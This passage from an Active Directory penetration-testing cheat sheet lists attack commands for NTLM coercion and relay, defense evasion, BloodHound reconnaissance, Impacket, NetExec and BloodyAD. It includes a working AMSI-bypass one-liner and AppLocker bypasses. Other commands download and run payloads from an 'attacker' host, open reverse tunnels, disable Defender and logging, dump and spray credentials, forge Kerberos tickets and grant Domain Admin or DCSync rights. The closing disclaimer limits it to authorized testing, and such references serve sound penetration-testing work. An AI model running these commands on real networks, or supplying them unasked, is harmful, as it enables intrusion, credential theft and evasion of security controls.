python3 PetitPotam.py attacker_ip target_ip
```

---

### DFSCoerce

> Coerces authentication via the Distributed File System (DFS) protocol.

```bash
python3 DFSCoerce.py -u user -p password -d domain attacker_ip target_ip
```

---

### WSPCoerce

> Coerces authentication via the Windows Search Protocol (WSP).

```bash
python3 WSPCoerce.py -u user -p password -d domain attacker_ip target_ip
```

---

### Coercer (Universal)

> Tests multiple coercion methods (MS-RPRN, MS-EFSRPC, MS-DFSNM, etc.) in one tool.

```bash
# Test all known coercion protocols against the target
python3 Coercer.py -u user -p password -d domain -l attacker_ip -t target_ip

# Test only the MS-RPRN (Printer Bug) coercion method
python3 Coercer.py -u user -p password -d domain -l attacker_ip -t target_ip --filter-protocol-name MS-RPRN
```

---

### NTLM Relay (ntlmrelayx)

> Captures NTLM authentication from coercion attacks and relays it to a different target service.

```bash
# Relay captured authentication to LDAPS to configure RBCD on a target computer
python3 ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# Relay to SMB to execute a command on the target
python3 ntlmrelayx.py -t smb://target -smb2support -c 'whoami /all'

# Relay to ADCS HTTP enrollment to get a certificate for the coerced account (ESC8)
python3 ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp --adcs --template DomainController

# Relay and open a SOCKS proxy for manual interaction with the relayed session
python3 ntlmrelayx.py -t smb://target -smb2support -socks
```

---

### Responder

> Captures NTLM hashes by poisoning LLMNR, NBT-NS, and MDNS name resolution on the local network.

```bash
# Start Responder to poison name resolution and capture NTLMv2 hashes
python3 Responder.py -I eth0 -dwPv

# Analyze mode — passive monitoring only, no poisoning (safe for enumeration)
python3 Responder.py -I eth0 -A
```

---

## 18. Evasion & Bypass Techniques

### AMSI Bypass

> AMSI (Antimalware Scan Interface) scans PowerShell commands before execution. Bypassing it allows running malicious PowerShell without detection.

```powershell
# Reflection-based AMSI bypass — patches the AMSI scan buffer in memory to disable scanning
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
# Note: AMSI bypasses get patched frequently — always test and use current methods
```

---

### InvisiShell

> Hooks CLR to bypass PowerShell security features (ScriptBlock logging, Module logging, AMSI, Constrained Language Mode).

```powershell
RunWithPathAsAdmin.bat                   # Run InvisiShell with admin privileges (patches via CLR hooking)
RunWithRegistryNonAdmin.bat              # Run InvisiShell without admin (uses registry-based CLR profiler bypass)
```

---

### AppLocker Bypass

> AppLocker restricts which executables can run. These bypass techniques use trusted directories or signed Microsoft binaries to execute arbitrary code.

```powershell
# Trusted directories — AppLocker often allows execution from these writable system paths
# Copy your payload to one of these and run it from there:
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\Registration\CRMLog\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\com\dmp\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\spool\PRINTERS\
C:\Windows\System32\spool\SERVERS\
C:\Windows\SysWOW64\Tasks\
C:\Windows\SysWOW64\com\dmp\

# InstallUtil bypass — uses a Microsoft-signed binary to execute a .NET payload (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# MSBuild bypass — uses Microsoft's build engine to execute inline C# code from an XML file
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# Regsvr32 bypass — uses regsvr32.exe (signed by Microsoft) to download and execute a scriptlet
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
```

---

### WDAC (Windows Defender Application Control) Bypass

> WDAC is a stronger code integrity policy than AppLocker. Bypass involves modifying PE metadata or using allowed binaries.

```powershell
# rcedit — modify the version information of a PE file to match an allowed publisher's metadata
rcedit-x64.exe payload.exe --set-version-string "CompanyName" "Microsoft Corporation"
rcedit-x64.exe payload.exe --set-version-string "ProductName" "Microsoft Windows"
# This tricks file-name/publisher-based WDAC rules (does NOT bypass signature validation)
```

---

### Loader / In-Memory Execution

> Execute .NET assemblies directly in memory without writing them to disk — bypasses file-based AV scanning.

```powershell
# Loader.exe — downloads and executes a .NET assembly entirely in memory
.\Loader.exe -path http://attacker/SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
.\Loader.exe -path .\Rubeus.exe -args "kerberoast /outfile:hashes.txt"

# Manual Assembly.Load — download a .NET assembly as bytes, load and execute in memory
$data = (New-Object Net.WebClient).DownloadData('http://attacker/payload.exe')
$assem = [Reflection.Assembly]::Load($data)
[Activator]::CreateInstance($assem.GetType("MainClass")).Main()
```

---

### Donut (Shellcode Generator)

> Converts .NET assemblies, EXEs, and DLLs into position-independent shellcode for injection into other processes.

```bash
# Convert a .NET assembly into x64 shellcode with encryption (arch=2=x64, encrypt=3=AES+LZNT1)
donut -f payload.exe -o payload.bin -a 2 -e 3

# Convert Rubeus into shellcode with embedded command-line arguments
donut -f Rubeus.exe -o rubeus.bin -a 2 -e 3 -p "kerberoast /outfile:hashes.txt"
```

---

### Obfuscation

```powershell
# Codecepticon — obfuscate a C# Visual Studio solution (renames variables, strings, etc.)
Codecepticon.exe --solution payload.sln --output-solution obfuscated.sln

# ConfuserEx — obfuscate a .NET assembly (control flow, string encryption, anti-tamper, anti-debug)
Confuser.CLI.exe project.crproj
```

---

### Port Forwarding

```powershell
# netsh portproxy — built-in Windows port forwarding (forward traffic from one port to another host)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=target_ip
netsh interface portproxy show all       # List all active port forwarding rules
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0  # Remove a rule
```

```bash
# Chisel — encrypted TCP tunnel over HTTP (great for pivoting through firewalls)
chisel server --reverse --port 8080              # Start Chisel server on the attacker machine (listens for client connections)
chisel client attacker_ip:8080 R:socks           # On the victim: connect back and create a SOCKS proxy on the attacker
chisel client attacker_ip:8080 R:8888:target_ip:445  # Forward victim's port 445 to attacker's port 8888

# Ligolo-ng — fast tunneling tool with a TUN interface (acts like a VPN)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601     # Start the proxy on the attacker (generates a self-signed cert)
ligolo-agent -connect attacker_ip:11601 -ignore-cert  # On the victim: connect to the attacker's proxy
```

---

### Disabling Defenses (Requires Admin)

```powershell
# Disable Windows Defender real-time monitoring (requires admin, logged by EDR)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable IOAV protection (scans for files downloaded from the internet)
Set-MpPreference -DisableIOAVProtection $true

# Disable Windows Firewall on all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disable PowerShell Script Block Logging via registry
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

---

## 19. BloodHound & Graph-Based Recon

### SharpHound (Collector)

> SharpHound collects AD relationship data (sessions, group memberships, ACLs, trusts) and outputs JSON files for BloodHound visualization.

```powershell
# Collect everything: users, groups, computers, sessions, ACLs, trusts, GPOs
SharpHound.exe --CollectionMethods All --ZipFileName output.zip

# Same but specify a target domain
SharpHound.exe --CollectionMethods All --Domain domain.local --ZipFileName output.zip

# Stealth mode — skip domain controllers, use quieter collection methods
SharpHound.exe --CollectionMethods All --ExcludeDomainControllers --Stealth

# DCOnly — only query domain controllers via LDAP (no network enumeration of sessions/local groups, very quiet)
SharpHound.exe --CollectionMethods DCOnly

# Collect only session and logon data (to map where users are logged in)
SharpHound.exe --CollectionMethods Session,LoggedOn

# PowerShell version
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName output.zip
Invoke-BloodHound -CollectionMethod All -Stealth
```

---

### bloodhound-python (Linux)

> Python-based BloodHound collector for running from Linux without touching a Windows machine.

```bash
# Collect all AD data from Linux and output as a zip for BloodHound
bloodhound-python -u user -p password -d domain.local -c All -dc dc.domain.local -ns DC_IP --zip

# Same but authenticating with NTLM hash
bloodhound-python -u user -p password -d domain.local -c All --hashes NTLM_HASH
```

---

### BloodHound CE (Community Edition)

```bash
# Deploy BloodHound Community Edition via Docker
curl -L https://ghst.ly/getbhce | docker compose -f - up
# Then upload SharpHound/bloodhound-python data via the web UI and explore attack paths
```

---

### Useful Cypher Queries

> Cypher queries for BloodHound's Neo4j database to find specific attack paths and misconfigurations.

```cypher
-- Find the shortest attack path from a specific user to Domain Admins
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- Find Kerberoastable users that have a path to Domain Admins (high-value targets)
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- List all users that don't require Kerberos pre-authentication (AS-REP Roastable)
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- List all computers with unconstrained delegation enabled
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- List all Group Policy Objects in the domain
MATCH (g:GPO) RETURN g.name, g.gpcpath

-- Find all users/groups that have DCSync rights on the domain
MATCH p=(u)-[:GetChanges|GetChangesAll|GenericAll]->(d:Domain) RETURN p

-- Find computers where the "Domain Users" group has local admin access
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:AdminTo]->(c:Computer) RETURN p
```

---

## 20. Impacket Suite

> Impacket is a Python framework for working with network protocols — essential toolkit for AD pentesting from Linux.

### Authentication & Execution

```bash
# PSExec — get a SYSTEM shell via SMB service creation (creates a service, uploads a binary)
python3 psexec.py domain/user:password@target
python3 psexec.py -hashes :NTLM_HASH domain/user@target        # PtH authentication
python3 psexec.py -k -no-pass domain/user@target                # Kerberos authentication (uses KRB5CCNAME ccache)

# WMIExec — execute commands via WMI (stealthier than PSExec, no service creation)
python3 wmiexec.py domain/user:password@target
python3 wmiexec.py -hashes :NTLM_HASH domain/user@target

# SMBExec — execute commands via a temporary SMB service (semi-interactive shell)
python3 smbexec.py domain/user:password@target

# DCOMExec — execute commands via DCOM (MMC20 or ShellBrowserWindow COM objects)
python3 dcomexec.py -object MMC20 domain/user:password@target
python3 dcomexec.py -object ShellBrowserWindow domain/user:password@target

# ATExec — execute a single command via the Task Scheduler service
python3 atexec.py -hashes :NTLM_HASH domain/user@target whoami
```

---

### Kerberos

```bash
# Request a TGT (Ticket Granting Ticket) and save as a .ccache file
python3 getTGT.py domain/user:password -dc-ip DC_IP             # Using password
python3 getTGT.py domain/user -hashes :NTLM_HASH -dc-ip DC_IP  # Using NTLM hash
python3 getTGT.py domain/user -aesKey AES256_KEY -dc-ip DC_IP   # Using AES256 key

# Request a service ticket via S4U (impersonate a user to a specific SPN)
python3 getST.py -spn CIFS/target.domain.local -impersonate Administrator -dc-ip DC_IP domain/user:password
python3 getST.py -spn CIFS/target.domain.local -impersonate Administrator -hashes :NTLM_HASH domain/user

# Kerberoast — request TGS tickets for all SPNed users and output crackable hashes
python3 GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -outputfile hashes.txt

# AS-REP Roast — request encrypted AS-REP for users without pre-auth
python3 GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile hashes.txt

# Forge a Golden Ticket (TGT) using the krbtgt hash
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# Forge a Silver Ticket (TGS) for a specific SPN using the service account hash
python3 ticketer.py -nthash HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator

# Forge a Golden Ticket with extra SID (for cross-domain escalation via SID History)
python3 ticketer.py -nthash HASH -domain-sid S-1-5-21-... -domain domain.local -extra-sid S-1-5-21-...-519 Administrator

# Set the Kerberos ticket cache for other tools to use
export KRB5CCNAME=/path/to/ticket.ccache
```

---

### Secrets & Enumeration

```bash
# SecretsDump — dump all secrets: DCSync hashes, SAM, LSA secrets, DPAPI keys
python3 secretsdump.py domain/user:password@DC_IP               # Full dump with password auth
python3 secretsdump.py -hashes :NTLM_HASH domain/user@DC_IP    # Full dump with PtH
python3 secretsdump.py -just-dc domain/user:password@DC_IP      # DCSync only (no SAM/LSA)
python3 secretsdump.py -just-dc-ntlm domain/user:password@DC_IP # DCSync only, NTLM hashes only
python3 secretsdump.py -just-dc-user krbtgt domain/user:password@DC_IP  # DCSync only the krbtgt account
python3 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL  # Parse offline NTDS.dit

# Enumerate SIDs and usernames by brute-forcing RIDs via SAMR
python3 lookupsid.py domain/user:password@DC_IP

# Dump user account info via the SAM Remote Protocol
python3 samrdump.py domain/user:password@DC_IP

# List all domain users via LDAP
python3 GetADUsers.py -all domain/user:password -dc-ip DC_IP

# Interactive SMB client (browse shares, upload/download files)
python3 smbclient.py domain/user:password@target

# Enumerate RPC endpoints on the target
python3 rpcdump.py domain/user:password@target

# Read remote registry keys
python3 reg.py domain/user:password@target query -keyName HKLM\\SOFTWARE -s

# List Windows services on the target
python3 services.py domain/user:password@target list

# Extract Group Policy Preferences (GPP) passwords from SYSVOL
python3 Get-GPPPassword.py domain/user:password@DC_FQDN

# Add a computer account to the domain (for RBCD attacks)
python3 addcomputer.py -method SAMR -computer-name FAKE$ -computer-pass Password123 -dc-ip DC_IP domain/user:password

# Configure RBCD on a target computer
python3 rbcd.py -action write -delegate-to "TARGET$" -delegate-from "FAKE$" -dc-ip DC_IP domain/user:password

# NTLM Relay — relay captured authentication to various services
python3 ntlmrelayx.py -t ldaps://DC_IP --delegate-access -smb2support  # Relay to LDAPS for RBCD setup
python3 ntlmrelayx.py -t smb://target -smb2support -c 'whoami'         # Relay to SMB for command execution
python3 ntlmrelayx.py -t smb://target -smb2support -socks               # Relay and open SOCKS proxy
```

---

## 21. CrackMapExec / NetExec

> NetExec (nxc) is the successor to CrackMapExec — a Swiss Army knife for network pentesting. Supports SMB, WinRM, LDAP, MSSQL protocols for authentication, enumeration, and execution.

```bash
# --- Authentication ---
nxc smb target -u user -p password                              # Test SMB authentication with password
nxc smb target -u user -H NTLM_HASH                             # Test SMB authentication with NTLM hash (PtH)
nxc smb target -u user -p password -d domain                     # Specify domain for authentication

# --- Enumeration ---
nxc smb target -u user -p password --users                       # Enumerate all domain users via SMB
nxc smb target -u user -p password --groups                      # Enumerate all domain groups
nxc smb target -u user -p password --shares                      # List all SMB shares and access permissions
nxc smb target -u user -p password --sessions                    # List active SMB sessions on the target
nxc smb target -u user -p password --loggedon-users              # List users currently logged on
nxc smb target -u user -p password --rid-brute                   # Brute-force RIDs to enumerate users/groups (works with limited access)
nxc smb target -u user -p password --pass-pol                    # Get the domain password policy (lockout threshold, complexity, etc.)
nxc smb target -u user -p password --local-groups                # Enumerate local groups on the target

# --- Null Session ---
nxc smb target -u '' -p ''                                       # Test for null session access (no credentials)

# --- Password Spraying ---
nxc smb target -u users.txt -p 'Password123'                    # Spray one password against a list of usernames
nxc smb target -u users.txt -p passwords.txt --no-bruteforce     # Test User1:Pass1, User2:Pass2 (paired, not all combinations)

# --- Command Execution ---
nxc smb target -u user -p password -x 'whoami'                  # Execute a CMD command on the target via SMB
nxc smb target -u user -p password -X 'whoami'                  # Execute a PowerShell command on the target via SMB
nxc smb target -u user -p password --exec-method wmiexec -x 'whoami'  # Force WMI as the execution method
nxc smb target -u user -p password --exec-method smbexec -x 'whoami'  # Force SMBExec as the execution method

# --- Kerberos Attacks ---
nxc ldap DC_IP -u user -p password --kerberoasting output.txt    # Kerberoast all SPNed accounts via LDAP
nxc ldap DC_IP -u users.txt -p '' --asreproast output.txt        # AS-REP Roast users from a list

# --- Delegation & Special Attributes ---
nxc ldap DC_IP -u user -p password --trusted-for-delegation      # Find accounts trusted for delegation

# --- LAPS & gMSA ---
nxc ldap DC_IP -u user -p password -M laps                       # Read LAPS passwords for computer accounts
nxc ldap DC_IP -u user -p password --gmsa                        # Read gMSA password hashes

# --- BloodHound ---
nxc ldap DC_IP -u user -p password --bloodhound --collection All  # Collect BloodHound data directly via NetExec

# --- SMB Signing Check ---
nxc smb targets.txt --gen-relay-list unsigned.txt                 # Check which hosts have SMB signing disabled (vulnerable to relay)

# --- Modules ---
nxc smb target -u user -p password -M coerce_plus                # Test for NTLM coercion vulnerabilities
nxc smb target -u user -p password -M timeroast                  # Check for TimeroAST vulnerability
nxc smb target -u user -p password -M spider_plus                # Spider all readable shares for sensitive files
nxc smb target -u user -p password -M mimikatz                   # Run Mimikatz remotely on the target
nxc smb target -u user -p password -M procdump                   # Dump LSASS via procdump on the target

# --- WinRM ---
nxc winrm target -u user -p password -x 'whoami'                 # Execute a command via WinRM
nxc winrm target -u user -H NTLM_HASH                            # WinRM authentication with PtH

# --- LDAP Queries ---
nxc ldap DC_IP -u user -p password --admin-count                  # Find accounts with AdminCount=1 (privileged)
nxc ldap DC_IP -u user -p password --password-not-required        # Find accounts with PASSWD_NOTREQD flag set
```

---

## 22. BloodyAD

> BloodyAD is a Python tool for AD privilege escalation. It manipulates AD objects via LDAP — changes passwords, modifies ACLs, configures delegation, and more.

```bash
# --- Enumeration ---
bloodyAD --host DC_IP -d domain -u user -p password get writable --detail     # Find all AD objects the current user can modify (and what permissions)
bloodyAD --host DC_IP -d domain -u user -p password get children 'DC=domain,DC=local' --type user  # List all user objects under a specific DN
bloodyAD --host DC_IP -d domain -u user -p password get object 'targetuser' --attr userAccountControl  # Read the userAccountControl flags for a user

# --- Password Operations ---
bloodyAD --host DC_IP -d domain -u user -p password set password 'targetuser' 'NewPassword123!'  # Force-reset a user's password (requires appropriate rights)

# --- Group Membership ---
bloodyAD --host DC_IP -d domain -u user -p password add groupMember 'Domain Admins' 'attacker'  # Add a user to a group (e.g., Domain Admins)

# --- ACL Manipulation ---
bloodyAD --host DC_IP -d domain -u user -p password add genericAll 'OU=Target,DC=domain,DC=local' 'attacker'  # Grant GenericAll permission on an OU
bloodyAD --host DC_IP -d domain -u user -p password add dcsync 'attacker'  # Grant DCSync rights (Replicating Directory Changes) to a user

# --- Shadow Credentials ---
bloodyAD --host DC_IP -d domain -u user -p password add shadowCredentials 'targetuser'     # Add a shadow credential to a target (for PKINIT auth)
bloodyAD --host DC_IP -d domain -u user -p password remove shadowCredentials 'targetuser'  # Remove shadow credentials from a target

# --- RBCD ---
bloodyAD --host DC_IP -d domain -u user -p password add rbcd 'target$' 'attacker$'        # Configure RBCD on a target (allow attacker$ to delegate)
bloodyAD --host DC_IP -d domain -u user -p password remove rbcd 'target$' 'attacker$'     # Remove RBCD configuration

# --- Computer Account ---
bloodyAD --host DC_IP -d domain -u user -p password add computer 'FakeComputer' 'Password123'  # Create a new machine account (for RBCD attacks)

# --- Account Control ---
bloodyAD --host DC_IP -d domain -u user -p password set object 'targetuser' userAccountControl 514   # Disable a user account (UAC 514 = ACCOUNTDISABLE + NORMAL_ACCOUNT)
bloodyAD --host DC_IP -d domain -u user -p password set object 'targetuser' userAccountControl 512   # Enable a user account (UAC 512 = NORMAL_ACCOUNT)

# --- SPN Manipulation ---
bloodyAD --host DC_IP -d domain -u user -p password set object 'targetuser' servicePrincipalName -v '["MSSQLSvc/target:1433"]'  # Set an SPN on a user (enables targeted Kerberoasting)

# --- Trust Enumeration ---
bloodyAD --host DC_IP -d domain -u user -p password get trusts   # List all domain trusts
```

---

## Quick Reference — Tool Download Links

| Tool | Source |
|------|--------|
| PowerView | PowerSploit / PowerShellMafia GitHub |
| AD Module | samratashok/ADModule GitHub |
| Rubeus | GhostPack/Rubeus GitHub |
| Mimikatz | gentilkiwi/mimikatz GitHub |
| Impacket | fortra/impacket GitHub |
| BloodHound CE | SpecterOps/BloodHound GitHub |
| SharpHound | BloodHoundAD/SharpHound GitHub |
| Certify | GhostPack/Certify GitHub |
| Certipy | ly4k/Certipy GitHub |
| NetExec | Pennyw0rth/NetExec GitHub |
| BloodyAD | CravateRouge/bloodyAD GitHub |
| PowerUpSQL | NetSPI/PowerUpSQL GitHub |
| SharpDPAPI | GhostPack/SharpDPAPI GitHub |
| Keycred | eladshamir GitHub |
| pywhisker | ShutdownRepo/pywhisker GitHub |
| SharpGPOAbuse | FSecureLABS/SharpGPOAbuse GitHub |
| PetitPotam | topotam/PetitPotam GitHub |
| Coercer | p0dalirius/Coercer GitHub |
| Responder | lgandx/Responder GitHub |
| InvisiShell | OmerYa/Invisi-Shell GitHub |
| Evil-WinRM | Hackplayers/evil-winrm GitHub |
| Chisel | jpillora/chisel GitHub |
| Ligolo-ng | nicocha30/ligolo-ng GitHub |
| Snaffler | SnaffCon/Snaffler GitHub |
| SOAPHound | FalconForce GitHub |
| SharpADWS | wh0amitz GitHub |
| DSInternals | MichaelGrafnetter/DSInternals GitHub |

---

> **Disclaimer:** This cheat sheet is for authorized penetration testing and educational purposes only. Always obtain proper authorization before testing.
